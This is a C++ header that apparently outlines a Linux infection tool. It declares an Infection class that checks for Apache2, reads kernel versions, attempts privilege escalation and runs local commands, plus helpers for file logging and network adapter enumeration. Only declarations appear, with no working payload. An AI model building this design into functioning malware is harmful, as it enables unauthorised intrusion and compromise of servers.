#include <iostream>
#include <stdio.h>
#include <fstream>
#include <stdlib.h>
#include <cstring>
#include <string>
#include <sys/types.h>
#include <vector>
#include <sys/stat.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>
#include <ctime>
#include <experimental/filesystem>
#pragma once

struct FileInformations{
	const char* fileName;
	int fileSize;
	int fileLinks;
	int fileiNode;
	char filePermissions[];
};

class FileUtilities{
public:
	void write2File(const char* fileName, std::string fileContent);
	void log2File(const char* fileDirectory, std::string logContent);
	char GetActualTime();
};

struct Adapters {
	std::string AdapterName;
	char Family;
	std::string LocalIPAddress;
};

class Networking {
public:
	std::vector<Adapters> adapters;	
	void enumerateAdapters();
};

class Infection : public Networking, public FileUtilities {
private:
	//Variables
	char* user;
	bool isApache2Present;
	char* KernelRelease;
	bool tryPrivilegeEscalation;
	char* KernelVersion;
	bool canInstall;
	bool InstallRequirements;
	//Fonctions
	FileInformations GetFileInformations(const char* fileName);
	void askForPrivilegeEscalation();
	void GetLinuxVersion();
	void runLocalCommand(const char* commandToRun, const char* errorMessage);
	void runLocalCommand(const char* commandToRun, const char* errorMessage, const char* successMessage);
	void runLocalCommand(const char* commandToRun, const char* errorMessage, const char* successMessage, const char* vOutput);
public:
	bool startInfection();
};	
